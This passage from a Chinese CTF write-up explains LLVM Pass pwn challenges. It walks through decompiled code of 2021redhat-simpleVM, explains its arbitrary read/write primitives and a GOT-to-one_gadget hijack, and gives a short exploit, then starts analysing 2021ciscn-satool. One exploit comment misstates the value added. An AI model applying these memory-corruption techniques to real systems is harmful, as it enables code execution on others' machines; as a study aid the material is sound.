class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Constants.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/BasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="built_in">end</span>();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;OpcodeName = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getOpcodeName</span>() &lt;&lt; <span class="string">&quot; NumOperands = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getNumOperands</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (instIter-&gt;<span class="built_in">getOpcode</span>() == <span class="number">56</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="type">const</span> CallInst* call_inst = <span class="built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;</span><br><span class="line">                    <span class="built_in">errs</span>() &lt;&lt; call_inst-&gt;<span class="built_in">getCalledFunction</span>()-&gt;<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; instIter-&gt;<span class="built_in">getNumOperands</span>()<span class="number">-1</span>; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">isa</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getOperand</span>(i)))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Operand &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getArgOperand</span>(i))-&gt;<span class="built_in">getZExtValue</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>上述代码中的<code>Hello</code>结构体继承了<code>LLVM</code>核心库中的<code>FunctionPass</code>类，并重写了其中的<code>runOnFunction</code>函数（一般的<code>CTF</code>题都是如此）。<strong><code>runOnFunction</code>函数在<code>LLVM</code>遍历到每一个传入的<code>LLVM IR</code>中的函数时都会被调用。</strong></p>
<ol>
<li><p><code>getName()</code>函数用于获取当前<code>runOnFunction</code>正处理的函数名</p>
</li>
<li><p>第一个<code>for</code>循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的<code>ll</code>文件中，不同基本块之间会有换行）遍历，第二个<code>for</code>循环是对每个基本块中的指令遍历</p>
</li>
<li><p><code>getOpcodeName()</code>函数用于获取指令的操作符的名称，<code>getNumOperands()</code>用于获取指令的操作数的个数，<code>getOpcode()</code>函数用于获取指令的操作符编号，在<code>/usr/include/llvm-xx/llvm/IR/Instruction.def</code>文件中有对应表，可以看到，<code>56</code>号对应着<code>Call</code>这个操作符：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">HANDLE_OTHER_INST</span>(``<span class="number">56</span>``, Call  , CallInst  ) <span class="comment">// Call a function</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>当在一个<code>A</code>函数中调用了<code>B</code>函数，在<code>LLVM IR</code>中，<code>A</code>会通过<code>Call</code>操作符调用<code>B</code>，<code>getCalledFunction()</code>函数就是用于获取此处<code>B</code>函数块的指针</p>
</li>
<li><code>getOperand(i)</code>是用于获取第<code>i</code>个操作数（在这里就是获取所调用函数的第<code>i</code>个参数），<code>getArgOperand()</code>函数与其用法类似，但只能获取参数，<code>getZExtValue()</code>即<code>get Zero Extended Value</code>，也就是将获取的操作数转为无符号扩展整数</li>
<li>再看到最内层<code>for</code>循环中的<code>instIter-&gt;getNumOperands()-1</code>，这里需要<code>-1</code>是因为对于<code>call</code>和<code>invoke</code>操作符，操作数的数量是实际参数的个数<code>+1</code>（因为将被调用者也当成了操作数）</li>
<li><code>if (isa&lt;ConstantInt&gt;(call_inst-&gt;getOperand(i)))</code>这行语句是通过<code>isa</code>判断当前获取到的操作数是不是立即数（<code>ConstantInt</code>）</li>
<li><code>static RegisterPass&lt;Hello&gt; X(&quot;Hello&quot;, &quot;Hello World Pass&quot;);</code>中的第一个参数就是注册的<code>PASS</code>名称</li>
</ol>
<p>使用以下命令将其编译为一个so模块</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<p>接着，通过<code>opt -load ./LLVMHello.so -Hello test.ll</code>命令运行，得到如下结果：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> aichch  ~/Program/clang  opt -load ./LLVMHello.so -Hello test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">OpcodeName = alloca NumOperands = 1</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line">puts</span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line"><span class="built_in">read</span></span><br><span class="line">Operand 0 = 0</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line">write</span><br><span class="line">Operand 0 = 1</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = ret NumOperands = 1</span><br></pre></td></tr></table></figure>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2021redhat-simpleVM"><a href="#2021redhat-simpleVM" class="headerlink" title="2021redhat-simpleVM"></a>2021redhat-simpleVM</h2><p>题目提供了三个文件</p>
<p><code>opt-8</code>,<code>VMPass.so</code>以及<code>libc-2.31.so</code></p>
<p>核心肯定在于<code>VMPass.so</code>,首先定位到RunOnFunction函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::getName(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sub_6AC0(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果函数名是<code>o0o0o0o0</code>则会进入<code>sub_6AC0</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3, <span class="number">1LL</span>);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其主要的逻辑又在于<code>sub_6B80</code></p>
<p>这个函数有点长就不完整放出来了,其内部主要在匹配<code>o0o0o0o0</code>函数的基本块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br></pre></td></tr></table></figure>
<p>遍历所有的基本块<code>BasicBlock</code>,然后使用<code>llvm::dyn_cast</code>(其功能是动态类型转换),将基本块指针转化为<code>Instruction</code>指针</p>
<p>如果操作码是一个call系统调用(Opcode:55),则将<code>Instruction</code>指针动态类型转化为<code>CallBase</code>指针</p>
<p>并进入深一步的判断,主要是匹配各个被调用的函数名字</p>
<p>有如下可能<code>pop push store load add min</code>,每个都对应一个处理</p>
<p>操作的关键有两个变量<code>off_20DFD0</code>与<code>off_20DFc0</code></p>
<p>其是两个指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DFC0 88 E5 20 00 00 00 00 00       off_20DFC0 dq offset reg2            </span><br><span class="line">LOAD:000000000020DFD0 80 E5 20 00 00 00 00 00       off_20DFD0 dq offset reg1 </span><br></pre></td></tr></table></figure>
<p><code>add()</code>和<code>min()</code>是一对函数，会通过第一个参数确定所要操作的全局变量，然后将第二个参数的值加上或减去。</p>
<p>其可以用于修改寄存器的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v11 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      v10 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">      v10 = off_20DFC0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">    v6 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      *v10 -= llvm::ConstantInt::getZExtValue(v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>store()</code>和<code>load()</code>也是一对函数，会将两个全局变量中的一个看作地址，并将地址中的值给另一个全局变量（<code>load()</code>任意地址读漏洞）或是将另一个全局变量中的值存放到这个地址中<code>store()</code>任意地址写漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v24 = <span class="number">0LL</span>;</span><br><span class="line">    v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">        v24 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">        v24 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于<code>opt</code>一般是不会开<code>PIE</code>保护的，故这里可以考虑先利用任意地址读漏洞通过<code>opt</code>中任意一个函数的<code>got</code>表拿到<code>libc</code>地址，并用<code>add</code>和<code>min</code>函数对其修改，再利用任意地址写漏洞来劫持<code>opt</code>中的某个<code>got</code>表为<code>one_gadget</code>即可</p>
<p>这里选择<code>free</code>,因为每一次循环结束都会有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      <span class="built_in">free</span>(s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">    v39,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
<p><code>./opt-8 -load ./VMPass.co -VMPass ./exp.ll</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void store(<span class="built_in">int</span> a);</span><br><span class="line">void load(<span class="built_in">int</span> a);</span><br><span class="line">void add(<span class="built_in">int</span> a, <span class="built_in">int</span> b);</span><br><span class="line"> </span><br><span class="line">void o0o0o0o0()&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);<span class="comment">#寄存器1变为0x77e100</span></span><br><span class="line">    load(<span class="number">1</span>);<span class="comment">#寄存器2获得0x77e100的值</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);<span class="comment">#寄存器2的值增加0x77e100</span></span><br><span class="line">    store(<span class="number">1</span>);<span class="comment">#寄存器1指向的值变为寄存器2的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><u>在打远程的时候，与内核和<code>QEMU</code>逃逸的题类似：将<code>exp.ll</code>或<code>exp.bc</code>通过<code>base64</code>加密传输到远程服务器，远程服务器会解码，并将得到的<code>LLVM IR</code>传给<code>LLVM</code>运行。</u></p>
<h2 id="2021ciscn-satool"><a href="#2021ciscn-satool" class="headerlink" title="2021ciscn-satool"></a>2021ciscn-satool</h2><p>题目给的文件还是老样子</p>
<p>直接ida打开SAPass.so,开始的start函数可以看到注册的Pass类就叫做<code>SAPass</code></p>
<p>根据之前说过的方法定位到重写的<code>RunOnFunction</code>函数为<code>sub_19D0</code></p>
<p>但这题的反编译结果要比上一题的复杂得多</p>
<p>虽然其中有很多是对非法信息的检测,只要我们正常编写程序都是不会触发的,所以可以忽略不计(嫌难看的话,因为这些报错代码都是连在一起的可以直接nop掉)</p>
<p>但就算这样代码也还是一坨,不过依据这类题目的尿性,以及自己做一些<u>调试</u>,就能判断出后面还是对<code>B4ckDo0r</code>函数内部调用的函数做判断</p>
<p>有如下可能<code>save takeway fakekey stealkey run</code></p>
<p>run中有一个特别显眼的块,调用了<code>byte_2040f8</code>指向的值作为函数指针调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    v4 = ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>,</span><br><span class="line">           <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们就看一下这个全局变量是怎么来的,是否存在操作空间</p>
<p>可以注意到其是在<code>save</code>函数的处理中被赋值的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub_2430(&amp;src, v20);</span><br><span class="line">sub_2430(v67, v24);</span><br><span class="line">v25 = n;</span><br><span class="line">v26 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v26[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">byte_2040f8 = v26;</span><br><span class="line">v27 = (<span class="type">char</span> *)src;</span><br><span class="line"><span class="built_in">memcpy</span>(v26, src, v25);</span><br><span class="line">v28 = v26 + <span class="number">1</span>;</span><br><span class="line">v29 = (<span class="type">char</span> *)v67[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(v28, v67[<span class="number">0</span>], (<span class="type">size_t</span>)v67[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>但我们有必要知道<code>memcpy(v26, src, v25);</code>往堆块了写了什么</p>
<p>可以看出其来源是<code>sub_2430(&amp;src, v20);</code></p>
